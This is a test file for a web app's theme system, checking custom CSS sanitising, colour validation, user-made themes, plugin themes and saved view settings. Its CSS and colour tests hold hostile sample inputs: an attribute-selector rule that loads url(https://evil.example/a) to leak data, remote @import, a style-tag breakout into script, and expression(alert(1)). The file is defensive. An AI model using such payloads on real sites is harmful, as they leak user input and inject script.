import { describe, expect, test } from "bun:test";
import { cleanShell, cleanViews } from "@/lib/shell-prefs";
import { readPluginHeader } from "@/lib/plugins";
import {
  accents,
  addOwnTheme,
  chooseTheme,
  chosenKey,
  cleanColour,
  cleanCss,
  cleanPluginTheme,
  cleanTheme,
  contrast,
  expandColours,
  MAX_OWN_THEMES,
  ownPalette,
  palettes,
  refreshedPluginTheme,
  removeOwnTheme,
  themeChoices,
  themeCss,
  themePlugin,
  themeScript,
  updateOwnTheme,
  type PluginThemePart,
} from "@/lib/themes";

// Themes and what views remember (beat-the-competitors.md, step 7).

describe("custom CSS", () => {
  test("can't load anything from elsewhere", () => {
    const evil = [
      "input[value^='a'] { background: url(https://evil.example/a) }",
      "@import 'https://evil.example/x.css';",
      "div { background: URL ( //evil.example ) }",
      "div { background: u\\72l(https://evil.example) }",
      "div { background-image: image-set('https://evil.example/a.png' 1x) }",
      "@font-face { font-family: x; src: url(//evil.example/f) }",
      "</style><script>alert(1)</script>",
    ].join("\n");
    const clean = cleanCss(evil);
    expect(clean).not.toMatch(/url\s*\(/i);
    expect(clean).not.toMatch(/@import/i);
    expect(clean).not.toMatch(/image-set\s*\(/i);
    expect(clean).not.toContain("\\");
    expect(clean).not.toMatch(/<\/?\s*style/i);
  });

  test("keeps ordinary CSS as it was", () => {
    const css = "html.dark { --background: #101010; }\n[data-slate-editor] { letter-spacing: 0.01em; background: linear-gradient(#fff, #eee); }";
    expect(cleanCss(css)).toBe(css);
  });

  test("is capped", () => {
    expect(cleanCss("a{}".repeat(10_000)).length).toBeLessThanOrEqual(20_000);
  });
});

describe("themes", () => {
  test("the default palette and accent aren't stored", () => {
    expect(cleanTheme({ palette: "paper", accent: "ember", css: "  " })).toBeUndefined();
    expect(cleanTheme({ palette: "sepia", accent: "blue" })).toEqual({ palette: "sepia", accent: "blue" });
    expect(cleanTheme({ palette: "neon", accent: "plaid" })).toBeUndefined();
  });

  test("the stylesheet outranks the app's own and sets light and dark", () => {
    const css = themeCss({ palette: "sepia", accent: "blue" });
    expect(css).toContain("html:root {");
    expect(css).toContain("html.dark {");
    expect(css).toContain("--background: #f4ecd8;");
    expect(css).toContain(`--ember: ${accents.blue.light};`);
    expect(css).toContain(`--ember: ${accents.blue.dark};`);
    expect(themeCss(undefined)).toBe("");
  });

  test("every palette sets real colours, and the script only ever sets text", () => {
    for (const p of Object.values(palettes)) for (const value of [...Object.values(p.light), ...Object.values(p.dark)]) expect(value).toMatch(/^(#[0-9a-f]{6}|rgb\([\d ./]+\)|color-mix\(in oklab, #[0-9a-f]{6} \d+%, transparent\))$/i);
    expect(themeScript).toContain("textContent");
    expect(themeScript).not.toContain("innerHTML");
  });

  test("kept with the person's setup", () => {
    expect(cleanShell({ theme: { palette: "forest", css: "a { color: red }" } }).theme).toEqual({ palette: "forest", css: "a { color: red }" });
  });
});

describe("colours", () => {
  test("only real colours, and nothing that loads", () => {
    expect(cleanColour(" #ABC ")).toBe("#aabbcc");
    expect(cleanColour("#112233")).toBe("#112233");
    expect(cleanColour("oklch(0.7 0.1 250 / 50%)")).toBe("oklch(0.7 0.1 250 / 50%)");
    for (const bad of ["red; } body { display: none", "url(https://evil.example)", "rgb(url(x))", "var(--x)", "#12", 4, "expression(alert(1))"]) expect(cleanColour(bad)).toBeNull();
  });

  test("a few base colours make a whole theme", () => {
    const full = expandColours({ background: "#ffffff", foreground: "#000000", ember: "#ff8800" }, "light");
    for (const name of ["card", "popover", "muted", "muted-foreground", "faint", "accent", "border", "sidebar", "sidebar-accent", "primary", "ring", "ember-ink"]) expect(full[name]).toBeDefined();
    expect(full.primary).toBe("#000000");
    // The accent as text is dark enough to read on the background.
    expect(contrast(full["ember-ink"], "#ffffff")!).toBeGreaterThanOrEqual(4.5);
    // What was given stays.
    expect(expandColours({ background: "#ffffff", foreground: "#000000", card: "#eeeeee" }, "light").card).toBe("#eeeeee");
  });
});

describe("the person's own themes", () => {
  test("made from the theme in use, put in use, changed and deleted", () => {
    const made = addOwnTheme({ palette: "sepia", accent: "blue" });
    expect(made.id).toBeTruthy();
    const own = made.theme!.own![0];
    expect(made.theme!.palette).toBe(ownPalette(own.id));
    expect(own.label).toBe("Sepia (mine)");
    expect(own.light.background).toBe(palettes.sepia.light.background);
    expect(own.light.ember).toBe(accents.blue.light);
    expect(made.theme!.accent).toBeUndefined();

    const changed = updateOwnTheme(made.theme, own.id, { label: "Night shift", dark: { background: "#000000", foreground: "#ffffff" } });
    expect(themeCss(changed)).toContain("html.dark { --background: #000000;");
    expect(chosenKey(changed)).toBe(ownPalette(own.id));

    const gone = removeOwnTheme(changed, own.id);
    expect(gone).toBeUndefined();
  });

  test("kept as far as they're valid, and only so many", () => {
    const own = Array.from({ length: MAX_OWN_THEMES + 3 }, (_, i) => ({ id: `t${i}`, label: `T${i}`, light: { background: "#ffffff", nope: "#000000", foreground: "url(x)" }, dark: {} }));
    const theme = cleanTheme({ palette: "own:t1", own: [...own, { id: "Bad id!", label: "x", light: {}, dark: {} }] })!;
    expect(theme.own).toHaveLength(MAX_OWN_THEMES);
    expect(theme.own![0].light).toEqual({ background: "#ffffff" });
    expect(theme.palette).toBe("own:t1");
    expect(cleanTheme({ palette: "own:missing", own })!.palette).toBeUndefined();
  });

  test("start over keeps them", () => {
    expect(cleanShell({ theme: { palette: "own:a", own: [{ id: "a", label: "A", light: {}, dark: {} }] } }).theme?.own).toHaveLength(1);
  });
});

describe("plugin themes", () => {
  const part: PluginThemePart = { pluginId: "p1", pluginName: "Nice themes", name: "harbour", title: "Harbour", theme: { light: { background: "#eef4f8", foreground: "#0b1d2a", ember: "#1971c2" }, dark: { background: "#0b1d2a", foreground: "#eef4f8" } } };

  test("listed with the app's and the person's own", () => {
    const choices = themeChoices({ own: [{ id: "a", label: "Mine", light: {}, dark: {} }] }, [part]);
    expect(choices.filter((c) => c.source === "app")).toHaveLength(Object.keys(palettes).length);
    expect(choices.find((c) => c.source === "plugin")).toMatchObject({ key: "plugin:p1:harbour", label: "Harbour", from: "Nice themes" });
    expect(choices.at(-1)).toMatchObject({ source: "own", label: "Mine" });
  });

  test("picking one keeps a copy, so it holds where plugins don't run", () => {
    const theme = chooseTheme({ accent: "rose", css: "a { color: red }" }, "plugin:p1:harbour", [part])!;
    expect(theme.palette).toBe("plugin");
    expect(theme.plugin).toMatchObject({ pluginId: "p1", id: "harbour", label: "Harbour", from: "Nice themes" });
    expect(theme.accent).toBe("rose");
    expect(themeCss(theme)).toContain("--background: #eef4f8;");
    // Without the plugin running, it's still listed and in use.
    expect(themeChoices(theme).some((c) => c.key === "plugin:p1:harbour")).toBe(true);
    expect(chosenKey(theme)).toBe("plugin:p1:harbour");
    // Picking another drops the copy.
    expect(chooseTheme(theme, "dusk", [part])).toEqual({ palette: "dusk", accent: "rose", css: "a { color: red }" });
    // A theme that isn't there changes nothing.
    expect(chooseTheme(theme, "plugin:p2:nope", [part])).toBe(theme);
  });

  test("the copy follows its plugin's updates", () => {
    const theme = chooseTheme(undefined, "plugin:p1:harbour", [part]);
    expect(refreshedPluginTheme(theme, [part])).toBeNull();
    const updated = { ...part, theme: { ...part.theme!, light: { ...part.theme!.light, background: "#ffffff" } } };
    expect(refreshedPluginTheme(theme, [updated])?.plugin?.light.background).toBe("#ffffff");
    expect(refreshedPluginTheme(theme, [])).toBeNull();
  });

  test("what a plugin hands over is cleaned", () => {
    expect(cleanPluginTheme({ light: { background: "url(//evil.example)", foreground: "#000" }, css: "@import 'x'; a { b: c }" })).toEqual({ light: { foreground: "#000000" }, dark: {}, css: "a { b: c }" });
    expect(cleanPluginTheme({ light: { nope: "#000" } })).toBeNull();
  });

  test("a theme becomes a plugin that registers it", () => {
    const code = themePlugin({ label: "Night shift", light: { background: "#ffffff" }, dark: { background: "#000000" } });
    expect(readPluginHeader(code)).toMatchObject({ name: "Night shift theme", access: "read" });
    const registered: unknown[] = [];
    new Function("plotra", code)({ registerTheme: (spec: unknown) => registered.push(spec) });
    expect(registered).toEqual([{ id: "night-shift", title: "Night shift", light: { background: "#ffffff" }, dark: { background: "#000000" } }]);
  });
});

describe("what views remember", () => {
  test("named settings with short, plain values", () => {
    expect(cleanViews({ "graph.depth": 2, "graph.hiddenKinds": ["folder", 3, "timeline"], "corkboard.size": "l", "outline.sort": "prop:pov:-1", "graph.orphans": false })).toEqual({
      "graph.depth": 2,
      "graph.hiddenKinds": ["folder", "timeline"],
      "corkboard.size": "l",
      "outline.sort": "prop:pov:-1",
      "graph.orphans": false,
    });
    expect(cleanViews({ "no-dot": 1, "a.b": { nested: true }, "x.y": null })).toBeUndefined();
    expect(cleanViews([1, 2])).toBeUndefined();
  });
});
